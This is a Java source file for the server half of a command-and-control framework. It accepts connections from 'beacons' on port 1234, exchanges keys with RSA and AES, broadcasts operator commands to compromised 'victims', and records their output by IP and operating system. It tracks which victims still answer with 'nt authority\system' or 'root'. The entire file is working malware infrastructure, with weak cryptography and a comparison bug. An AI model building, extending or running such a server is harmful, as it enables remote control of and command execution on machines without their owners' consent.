package Servers.C2;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;

import Servers.Duplexer;
import Servers.notifyLock;
import Servers.encryption.aes.*;
import Servers.encryption.rsa.*;

public class C2Server implements Runnable{
    // Dictionary of all of the longRangeBeacons currently reporting back to the C2
    // Formatted IP Address, Duplexer Pointer
    private HashMap<String,C2ServerBeaconHandler> longRangeBeacons;

    // Dictionaries to Map IP's to Client responses
    private HashMap<String,ArrayList<String>> windowsClientResponses;
    private HashMap<String,ArrayList<String>> linuxClientResponses;

    // Bionded Server Socket
    private ServerSocket serverSocket;

    // Pointer to the Handler for User Input
    private C2ServerUserHandler userHandler;

    // Boolean to determine if server should remain running
    private boolean sentinel = true;

    // String for an IP address of a beacaon attempting to authenticate
    private String attemptedAuthIP;

    // Object used as lock for wait()/notify() to get responses instantly when in a shell
    private Object shellLock;

    // ID used by threads to make sure that .notify() is not called extra times multiple times
    private int shellID;

    // Object used to do RSA encryption and Decryption
    private rsa rsa;

    // Text colors for Hard visuals
    private String GREEN = "\u001B[32m";
    private String RESET = "\u001B[37m";
    private String RED = "\u001B[31m";

    /**
     * Initializes a Command and Control Server to handle connections from Long Range Beacons
     * Long Range Beacons handle all of the clients (victims)
     * @throws IOException
     */
    public C2Server() throws IOException{
        this.shellLock = new Object();
        this.shellID = 0;
        this.longRangeBeacons = new HashMap<>();
        this.serverSocket = new ServerSocket(1234);
        this.userHandler = new C2ServerUserHandler(this);
        this.rsa = new rsa(1024);
        this.windowsClientResponses = new HashMap<>();
        this.linuxClientResponses = new HashMap<>();
    }

    /**
     * Whenever a command is issued by the User, this function is used to
     * Then send the command to the long range beacons individually.
     * 
     * @param command Command issued to the long range beacons.
     */
    protected void broadcastToBeacons(String command){
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.sendToBeacon(command);
        }
    }

    /**
     * Used by the Beacon Handler to send a message to the User Handler
     * 
     * @param message Message to be displayed in the User CLI
     */
    protected void outputToUserHandler(String message){
        synchronized(userHandler){
            userHandler.outputToCLI(message);
        }
    }

    protected void stopServer(){
        sentinel = false; 
        try{
            serverSocket.close();
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    /**
     * Takes a client's IP Address, and returns the Operating System of the client
     * @param IPAddress - Client IP Address
     * @return Operating System of Client
     */
    protected String getClientOS(String IPAddress){
        synchronized(windowsClientResponses){
            if(windowsClientResponses.containsKey(IPAddress)){
                return "Windows";
            }
        }
        synchronized(linuxClientResponses){
            if(linuxClientResponses.containsKey(IPAddress)){
                return "Linux";
            }
        }
        return "none";
    }

    /**
     * Creates HashMaps to store responses for a new client
     * @param IPAddress - IP Address of new client
     * @param OS - Operating System of new client
     */
    protected void intializeVars(String IPAddress, String OS){
        if(OS.contains("Windows")){
            windowsClientResponses.put(IPAddress, new ArrayList<>());
        } else if(OS.contains("Linux")){
            linuxClientResponses.put(IPAddress, new ArrayList<>());
        }
    }

    public int getShellID(){
        return shellID;
    }

    protected void getShellResponse(String command){
        // Create a new thread that will notify the lock after 10 seconds, just in case we don't receive anything back from the client
        shellID++;
        notifyLock backupNotifyLock = new notifyLock(shellLock, this, shellID);
        Thread backupNotifyLockThread = new Thread(backupNotifyLock);
        backupNotifyLockThread.start();

        // Distribute the commands
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.setIsShell(true);
            beaconHandler.sendToBeacon(command);
        }

        // Wait for a response, once notified, notify the user handler that it can now continue
        try{
            synchronized(shellLock){
                shellLock.wait();
            }
        } catch (InterruptedException e){
            e.printStackTrace();
        }
        
        // Set each beaconHandler to not notify when it receives a response now
        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
            beaconHandler.setIsShell(false);
        }
    }

     /**
     * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
     * 
     * @param IPAddress the IP Address of the Client that the response came from
     * @param Response The Response sent from the client
     */
    protected void addDataToResponsesDictionaries(String IPAddress, String Response){
        String os = getClientOS(IPAddress);
        if(os.equals("Windows")){
            synchronized(windowsClientResponses){
                windowsClientResponses.get(IPAddress).add(Response);
            }
        } else if(os.equals("Linux")){
            synchronized(linuxClientResponses){
                linuxClientResponses.get(IPAddress).add(Response);
            }
        }
    }

    /**
     * Get Responses from cleints to Commands issued by the C2 Server
     * 
     * @param scope Either Windows, Linux, or an IP Address. The IP address may contains Wildcards, such as 192.168.1.x
     * @return A Hash map with the client's ip address as the key, and an ArrayList containing all of it's resonses as the value
     */
    protected HashMap<String, ArrayList<String>> getClientResponses(String scope){
        HashMap<String, ArrayList<String>> responses = new HashMap<>();
        if(scope.equals("Windows")){
            synchronized(windowsClientResponses){
                for(String ip : windowsClientResponses.keySet()) {
                    responses.put(ip, windowsClientResponses.get(ip));
                }
            }
        } else if(scope.equals("Linux")){
            synchronized(linuxClientResponses){
                for(String ip : linuxClientResponses.keySet()) {
                    responses.put(ip, linuxClientResponses.get(ip));
                }
            }
        // Range of IPs 
        } else {
            ArrayList<String> ips = getIPMatches(scope);
            for (String ip : ips){
                synchronized(windowsClientResponses){
                    synchronized(linuxClientResponses){
                        if(windowsClientResponses.keySet().contains(ip)){
                            responses.put(ip, windowsClientResponses.get(ip));
                        } else if(linuxClientResponses.keySet().contains(ip)){
                            responses.put(ip, linuxClientResponses.get(ip));
                        }
                    }
                }
            }
        }
        return responses;
    }

    /**
     * This Function takes an IP address, with a wildcard character, and returns all
     * Matches for that IP Address. 
     * 
     * Example
     * Client IP Address = {192.168.1.1, 192.168.4.5, 10.1.10.1, 10.2.10.1}
     * 
     * Parameter 10.x.10.1
     * Return Value {10.1.10.1, 10.2.10.1}
     * 
     * Parameter 192.168.1.x
     * Return Value {192.168.1.1}
     * 
     * Parameter 192.168.x.x
     * Return Value {192.168.1.1, 192.168.4.5}
     * 
     * Parameter 172.16.x.15
     * Return Value {}
     * 
     * @param IPAddress IP Address to Match
     * @return All Clients with a matching IP Address
     */
    private ArrayList<String> getIPMatches(String IPAddress){
        ArrayList<String> matches = new ArrayList<>();
        String octets[] = IPAddress.split("\\.");
        for(String ip : windowsClientResponses.keySet()){
            String clientOctets[] = ip.split("\\.");
            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
                matches.add(ip);
            }
        }
        for(String ip : linuxClientResponses.keySet()){
            String clientOctets[] = ip.split("\\.");
            if ((octets[0].equals(clientOctets[0]) || octets[0].equals("x")) &&
                (octets[1].equals(clientOctets[1]) || octets[1].equals("x")) &&
                (octets[2].equals(clientOctets[2]) || octets[2].equals("x")) &&
                (octets[3].equals(clientOctets[3]) || octets[3].equals("x"))) {
                matches.add(ip);
            }
        }
        return matches;
    }

    /**
     * This function will provide the Status (Can the C2 Server still run commands on the clients). Enspired by Ansible Ping
     * 
     * @param Scope Either "All", "Windows", "Linux", or the IP Address (x.x.x.x) of the Computer of whose status is desired
     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
     * communicate with the Beacon, False if the client cannot communicate with the Beacon
     */
    protected String getClientStatus(){
        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
        // True if the client is still active, false if the client is no longer active.
        HashMap<String, Boolean> clientStatus = new HashMap<>();

        for (String ip : windowsClientResponses.keySet()){
            if (windowsClientResponses.get(ip).size() != 0){
                if ((windowsClientResponses.get(ip).contains("nt authority\\system")) && !windowsClientResponses.get(ip).contains("DISCONNECTED")){
                    // If responses contains the string we just send a command to get, then remove it, and give it true
                    ArrayList<String> tempList = windowsClientResponses.get(ip);
                    tempList.remove("nt authority\\system");
                    windowsClientResponses.put(ip, tempList);
                    clientStatus.put(ip, true);
                } else {
                    clientStatus.put(ip, false);
                }
            }   
        }

        // Check all Linux Boxes
        for (String ip : linuxClientResponses.keySet()){
            if (linuxClientResponses.get(ip).size() != 0){
                if (linuxClientResponses.get(ip).contains("root") && !linuxClientResponses.get(ip).contains("DISCONNECTED")){
                    // If responses contains the string we just send a command to get, then remove it, and give it true
                    ArrayList<String> tempList = linuxClientResponses.get(ip);
                    tempList.remove("root");
                    linuxClientResponses.put(ip, tempList);
                    clientStatus.put(ip, true);
                } else {
                    clientStatus.put(ip, false);
                }
            }   
        }
        

        // Creating fire visually pleasing table of client status
        String table = " ________________________________________________\n";
        table += String.format("| %-20s | %-23s |\n", "IP", "Connection Status");
        table += "|______________________|_________________________|\n";
        Map<String, Boolean> sortedByKey = new TreeMap<>(clientStatus);
        for (String ip : sortedByKey.keySet()) {
            String status;
            boolean status_bool;
            if (clientStatus.get(ip)) {
                status = GREEN + "CONNECTED :D" + RESET;
                status_bool = false;
            } else {
                status = RED + "DISCONNECTED D:" + RESET;
                status_bool = true;
            }
            // If the status is disconnected
            if (status_bool){
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
            // If the status is connected
            else {
                table += String.format("| %-20s | %-33s |\n", ip, status);
            }
        }
        table += "|______________________|_________________________|\n";
        return table;
    }
    
    @Override
    public void run(){
        // Start Thread to handle commands from the user
        Thread userHandlerThread = new Thread(userHandler);
        userHandlerThread.start();
        
        // Always listen for new long range beacons
        while(sentinel){
            try{
                // Accept a new connection
                Socket socket = serverSocket.accept();

                // Create a new Duplexer
                Duplexer duplexer = new Duplexer(socket);

                // Get the IP address of the Duplexer
                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
                // We just care about the IP Address though
                String unformattedIPAddress = socket.getRemoteSocketAddress().toString();
                String IPAddress = unformattedIPAddress.split(":")[0].substring(1);
                attemptedAuthIP = IPAddress;

                // Send public key to beacon
                duplexer.send(rsa.getN(), true);
                duplexer.send(rsa.getE(), true);
                
                // Beacon key will encrypt the AES session key with the RSA public key
                String x = duplexer.receive(true);
                x = x.substring(0, x.length() - 1);
                String aesKey = rsa.decrypt(x);
                if(aesKey.length() % 8 != 0){
                    aesKey = "0" + aesKey;
                }
                aes aes = new aes(aesKey, modes.ECB);
                
                // Receive initial message for authentication from the new Beacon
                String hashedPassForAuth = aes.decrypt(duplexer.receive(true));

                // Pass this hash to the User Handler thread for MFA
                String authResponse = userHandler.authenticateToC2(hashedPassForAuth, IPAddress);
                duplexer.send(aes.encrypt(authResponse), true);
                if(!(authResponse.equals("Authentication Successful"))){
                    duplexer.close();
                }else{
                    // Create a new thread to handle each Long Range Beacon
                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IPAddress, this, shellLock, aes);
                    Thread beaconHandlerThread = new Thread(beaconHandler);

                    // Store IP and Duplexer pointer in the dicitonary
                    longRangeBeacons.put(IPAddress, beaconHandler);

                    // Start the thread
                    beaconHandlerThread.start();
                }
                
            } catch(SocketException e){
                userHandler.outputToCLI("Attempted Beacon Authentication failed from " + attemptedAuthIP);
            } catch(IOException e){
                // Only print out when sentinel is true, if sentinel is false, then the C2 Server is shutting down
                if(sentinel = true){
                    e.printStackTrace();
                }
            }
        }
    }

    public static void main(String[] args) throws IOException{
        C2Server server = new C2Server();
        Thread serverThread = new Thread(server);
        serverThread.start();
    }
}

